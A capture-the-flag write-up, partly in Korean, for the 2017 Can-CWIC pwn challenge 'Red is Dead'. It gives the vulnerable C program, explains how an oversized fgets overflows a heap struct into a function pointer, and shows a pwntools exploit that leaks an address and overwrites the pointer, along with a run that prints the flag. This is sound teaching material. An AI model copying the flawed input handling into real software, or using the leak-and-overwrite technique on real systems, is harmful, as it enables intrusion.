# [2017_Can-CWIC] \[PWN] Red is Dead

## Key words

- Heap based buffer overflow | 힙 오버플로우
- Memory leak

## Problem

```
Can you pass the bridge?

nc 159.203.38.169 5683
```

## Analysis

```c
#include<stdio.h>
#include<stdlib.h>
#include<string.h>

struct user {
	char color[8];
	char name[8];
	void (*next)(struct user*);
};

void chomp(char *str) {
	ssize_t last = strlen(str) - 1;
	if (last >= 0 && str[last] == '\n')
		str[last] = '\0';
}

void dead(struct user *user) {
	printf("%s: Auuuuuuuugh!\n", user->name);
	user->next = NULL;
}

void success_knight(struct user *user) {
	printf("Keeper: Right. Off you go.\n");
	user->next = NULL;
}

void success_king(struct user *user) {
	printf("Keeper: What? I don't know that! Auuuuuuuugh!\n");
	printf("FLAG\n");
	user->next = NULL;
}

void check_knight(struct user *user) {
	user->next = success_knight;
	printf("Keeper: What is your favorite color?\n");
	char *res = fgets(user->color, sizeof(struct user), stdin);
	if (res == NULL) {
		user->next = NULL;
		return;
	}
	chomp(user->color);
	if (strcmp(user->color,"red")) {
		user->next = dead;
	}
}

void check_king(struct user *user) {
	user->next = success_king;
	printf("Keeper: What is the air-speed velocity of an unladen swallow?\n");
	printf("%s: What do you mean?\n", user->name);
	char *res = fgets(user->color, sizeof(struct user), stdin);
	if (res == NULL) {
		user->next = NULL;
		return;
	}
	chomp(user->color);
	user->next = success_king;
	if (strcmp(user->color,"An African or European swallow?")) {
		user->next = dead;
	}
}

void start(struct user *user) {
	printf("Keeper: Stop! What is your name?\n");
	char *res = fgets(user->name, sizeof(struct user), stdin);
	if (res == NULL) {
		user->next = NULL;
		return;
	}
	chomp(user->name);

	size_t len = strlen(user->name);
	if (len < 2) {
		printf("Keeper: Sorry `%s', your name is too short\n", user->name);
		user->next = NULL;
		return;
	}

	if(!strncmp(user->name, "Arthur", 6)) {
		user->next = check_king;
		printf("Arthur: It is Arthur, King of the Britons.\n");
	} else {
		user->next = check_knight;
		printf("%s: Sir %s of Camelot.\n", user->name, user->name);
	}
}

int main(void) {
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	struct user *user = malloc(sizeof(struct user));
	user->next = start;
	while(user->next) user->next(user);
	return 0;
}
```

소스코드가 주어졌습니다. 취약점은 다음과 같습니다.

### Heap based buffer overflow

```c
fgets(user->name, sizeof(struct user), stdin);
```

`user->name`의 크기가 아닌 structure의 크기만큼 입력을 받습니다. 이를 통해 힙 오버플로우가 발생합니다.

### 공격 시나리오

`success_king` 함수에서 flag를 출력해주기 때문에 이 함수를 호출시켜야합니다.

근데 소스코드만 주어졌기 때문에 실제 서버에서 메모리 페이징이 어떻게 이뤄졌는지 모릅니다. 따라서 메모리 릭을 통해 알아내야 합니다.

1. 메모리 릭
2. 힙 오버플로우

## Exploit

```python
from pwn import *

#p = process("./red_is_dead")
p = remote("159.203.38.169", 5683)
print p.recv()
p.sendline("a"*8)
p.recvuntil("a"*8)
success_knight = u64(p.recvuntil(":")[:-1].ljust(8,"\x00"))
success_king = success_knight-47
log.info("success_knight = "+hex(success_knight))
log.info("success_king = "+hex(success_king))
print p.recv()
p.sendline("red"+"\x00"*13+p64(success_king))
p.interactive()
```

## Result

```
[+] Opening connection to 159.203.38.169 on port 5683: Done
Keeper: Stop! What is your name?
[*] success_knight = 0x560f12f4f9fb
[*] success_king = 0x560f12f4f9cc
 Sir aaaaaaaa???V of Camelot.
Keeper: What is your favorite color?

[*] Switching to interactive mode
Keeper: What? I don't know that! Auuuuuuuugh!
FLAG{Y0uCr0ss3dTh3Br1g30fD3ath}
[*] Got EOF while reading in interactive
```

